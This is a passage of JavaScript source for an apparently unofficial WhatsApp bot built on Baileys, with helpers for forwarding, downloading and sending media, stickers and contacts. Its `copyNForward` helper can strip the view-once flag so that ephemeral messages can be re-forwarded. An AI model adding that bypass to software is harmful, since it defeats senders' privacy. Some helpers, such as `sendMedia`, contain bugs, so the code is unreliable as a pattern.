  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
  } else if (
  command.on === "sticker" &&
  mek.type === "stickerMessage"
  ) {
  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
  }});
  
  });
    //===================================================   
    conn.decodeJid = jid => {
      if (!jid) return jid;
      if (/:\d+@/gi.test(jid)) {
        let decode = jidDecode(jid) || {};
        return (
          (decode.user &&
            decode.server &&
            decode.user + '@' + decode.server) ||
          jid
        );
      } else return jid;
    };
    //===================================================
    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
      let vtype
      if (options.readViewOnce) {
          message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
          vtype = Object.keys(message.message.viewOnceMessage.message)[0]
          delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
          delete message.message.viewOnceMessage.message[vtype].viewOnce
          message.message = {
              ...message.message.viewOnceMessage.message
          }
      }
    
      let mtype = Object.keys(message.message)[0]
      let content = await generateForwardMessageContent(message, forceForward)
      let ctype = Object.keys(content)[0]
      let context = {}
      if (mtype != "conversation") context = message.message[mtype].contextInfo
      content[ctype].contextInfo = {
          ...context,
          ...content[ctype].contextInfo
      }
      const waMessage = await generateWAMessageFromContent(jid, content, options ? {
          ...content[ctype],
          ...options,
          ...(options.contextInfo ? {
              contextInfo: {
                  ...content[ctype].contextInfo,
                  ...options.contextInfo
              }
          } : {})
      } : {})
      await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
      return waMessage
    }
    //=================================================
    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
      let quoted = message.msg ? message.msg : message
      let mime = (message.msg || message).mimetype || ''
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
      const stream = await downloadContentFromMessage(quoted, messageType)
      let buffer = Buffer.from([])
      for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk])
      }
      let type = await FileType.fromBuffer(buffer)
      trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
          // save to file
      await fs.writeFileSync(trueFileName, buffer)
      return trueFileName
    }
    //=================================================
    conn.downloadMediaMessage = async(message) => {
      let mime = (message.msg || message).mimetype || ''
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
      const stream = await downloadContentFromMessage(message, messageType)
      let buffer = Buffer.from([])
      for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk])
      }
    
      return buffer
    }
    
    /**
    *
    * @param {*} jid
    * @param {*} message
    * @param {*} forceForward
    * @param {*} options
    * @returns
    */
    //================================================
    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
                  let mime = '';
                  let res = await axios.head(url)
                  mime = res.headers['content-type']
                  if (mime.split("/")[1] === "gif") {
                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
                  }
                  let type = mime.split("/")[0] + "Message"
                  if (mime === "application/pdf") {
                    return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
                  }
                  if (mime.split("/")[0] === "image") {
                    return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
                  }
                  if (mime.split("/")[0] === "video") {
                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
                  }
                  if (mime.split("/")[0] === "audio") {
                    return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
                  }
                }
    //==========================================================
    conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
      //let copy = message.toJSON()
      let mtype = Object.keys(copy.message)[0]
      let isEphemeral = mtype === 'ephemeralMessage'
      if (isEphemeral) {
          mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
      }
      let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
      let content = msg[mtype]
      if (typeof content === 'string') msg[mtype] = text || content
      else if (content.caption) content.caption = text || content.caption
      else if (content.text) content.text = text || content.text
      if (typeof content !== 'string') msg[mtype] = {
          ...content,
          ...options
      }
      if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
      else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
      if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
      else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
      copy.key.remoteJid = jid
      copy.key.fromMe = sender === conn.user.id
    
      return proto.WebMessageInfo.fromObject(copy)
    }
    
    
    /**
    *
    * @param {*} path
    * @returns
    */
    //=====================================================
    conn.getFile = async(PATH, save) => {
      let res
      let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
          //if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
      let type = await FileType.fromBuffer(data) || {
          mime: 'application/octet-stream',
          ext: '.bin'
      }
      let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
      if (data && save) fs.promises.writeFile(filename, data)
      return {
          res,
          filename,
          size: await getSizeMedia(data),
          ...type,
          data
      }
    
    }
    //=====================================================
    conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
      let types = await conn.getFile(PATH, true)
      let { filename, size, ext, mime, data } = types
      let type = '',
          mimetype = mime,
          pathFile = filename
      if (options.asDocument) type = 'document'
      if (options.asSticker || /webp/.test(mime)) {
          let { writeExif } = require('./exif.js')
          let media = { mimetype: mime, data }
          pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] })
          await fs.promises.unlink(filename)
          type = 'sticker'
          mimetype = 'image/webp'
      } else if (/image/.test(mime)) type = 'image'
      else if (/video/.test(mime)) type = 'video'
      else if (/audio/.test(mime)) type = 'audio'
      else type = 'document'
      await conn.sendMessage(jid, {
          [type]: { url: pathFile },
          mimetype,
          fileName,
          ...options
      }, { quoted, ...options })
      return fs.promises.unlink(pathFile)
    }
    //=====================================================
    conn.parseMention = async(text) => {
      return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
    }
    //=====================================================
    conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
      let types = await conn.getFile(path, true)
      let { mime, ext, res, data, filename } = types
      if (res && res.status !== 200 || file.length <= 65536) {
          try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
      }
      let type = '',
          mimetype = mime,
          pathFile = filename
      if (options.asDocument) type = 'document'
      if (options.asSticker || /webp/.test(mime)) {
          let { writeExif } = require('./exif')
          let media = { mimetype: mime, data }
          pathFile = await writeExif(media, { packname: options.packname ? options.packname : Config.packname, author: options.author ? options.author : Config.author, categories: options.categories ? options.categories : [] })
          await fs.promises.unlink(filename)
          type = 'sticker'
          mimetype = 'image/webp'
      } else if (/image/.test(mime)) type = 'image'
      else if (/video/.test(mime)) type = 'video'
      else if (/audio/.test(mime)) type = 'audio'
      else type = 'document'
      await conn.sendMessage(jid, {
          [type]: { url: pathFile },
          caption,
          mimetype,
          fileName,
          ...options
      }, { quoted, ...options })
      return fs.promises.unlink(pathFile)
    }
    /**
    *
    * @param {*} message
    * @param {*} filename
    * @param {*} attachExtension
    * @returns
    */
    //=====================================================
    conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifVid(buff, options);
      } else {
        buffer = await videoToWebp(buff);
      }
      await conn.sendMessage(
        jid,
        { sticker: { url: buffer }, ...options },
        options
      );
    };
    //=====================================================
    conn.sendImageAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifImg(buff, options);
      } else {
        buffer = await imageToWebp(buff);
      }
      await conn.sendMessage(
        jid,
        { sticker: { url: buffer }, ...options },
        options
      );
    };
        /**
         *
         * @param {*} jid
         * @param {*} path
         * @param {*} quoted
         * @param {*} options
         * @returns
         */
    //=====================================================
    conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })
    
            /**
             *
             * @param {*} jid
             * @param {*} path
             * @param {*} quoted
             * @param {*} options
             * @returns
             */
    //=====================================================
    conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
      let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
      return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
    }
    
    /**
    *
    * @param {*} jid
    * @param {*} path
    * @param {*} caption
    * @param {*} quoted
    * @param {*} options
    * @returns
    */
    //=====================================================
    conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })
    
    /**
     *
     * @param {*} jid
     * @param {*} path
     * @param {*} caption
     * @param {*} quoted
     * @param {*} options
     * @returns
     */
    //=====================================================
    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
      let buttonMessage = {
              text,
              footer,
              buttons,
              headerType: 2,
              ...options
          }
          //========================================================================================================================================
      conn.sendMessage(jid, buttonMessage, { quoted, ...options })
    }
    //=====================================================
    conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
      let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
      var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
          templateMessage: {
              hydratedTemplate: {
                  imageMessage: message.imageMessage,
                  "hydratedContentText": text,
                  "hydratedFooterText": footer,
                  "hydratedButtons": but
              }
          }
      }), options)
      conn.relayMessage(jid, template.message, { messageId: template.key.id })
    }
    
    /**
    *
    * @param {*} jid
    * @param {*} buttons
    * @param {*} caption
    * @param {*} footer
    * @param {*} quoted
    * @param {*} options
    */
    //=====================================================
    conn.getName = (jid, withoutContact = false) => {
            id = conn.decodeJid(jid);

            withoutContact = conn.withoutContact || withoutContact;

            let v;

            if (id.endsWith('@g.us'))
                return new Promise(async resolve => {
                    v = store.contacts[id] || {};

                    if (!(v.name.notify || v.subject))
                        v = conn.groupMetadata(id) || {};

                    resolve(
                        v.name ||
                            v.subject ||
                            PhoneNumber(
                                '+' + id.replace('@s.whatsapp.net', ''),
                            ).getNumber('international'),
                    );
                });
            else
                v =
                    id === '0@s.whatsapp.net'
                        ? {
                                id,

                                name: 'WhatsApp',
                          }
                        : id === conn.decodeJid(conn.user.id)
                        ? conn.user
                        : store.contacts[id] || {};

            return (
                (withoutContact ? '' : v.name) ||
                v.subject ||
                v.verifiedName ||
                PhoneNumber(
                    '+' + jid.replace('@s.whatsapp.net', ''),
                ).getNumber('international')
            );
        };

        // Vcard Functionality
        conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
            let list = [];
            for (let i of kon) {
                list.push({
                    displayName: await conn.getName(i + '@s.whatsapp.net'),
                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
                        i + '@s.whatsapp.net',
                    )}\nFN:${
                        global.OwnerName
                    }\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${
                        global.email
                    }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
                        global.github
                    }/khan-xmd\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
                        global.location
                    };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
                });
            }
            conn.sendMessage(
                jid,
                {
                    contacts: {
                        displayName: `${list.length} Contact`,
                        contacts: list,
                    },
                    ...opts,
                },
                { quoted },
            );
        };

        // Status aka brio
        conn.setStatus = status => {
            conn.query({
                tag: 'iq',
                attrs: {
                    to: '@s.whatsapp.net',
                    type: 'set',
                    xmlns: 'status',
                },
                content: [
                    {
                        tag: 'status',
                        attrs: {},
                        content: Buffer.from(status, 'utf-8'),
                    },
                ],
            });
            return status;
        };
    conn.serializeM = mek => sms(conn, mek, store);
  }
  
  app.get("/", (req, res) => {
  res.send("POPKID IS  STARTED ✅");
  });
  app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
  setTimeout(() => {
  connectToWA()
  }, 4000);
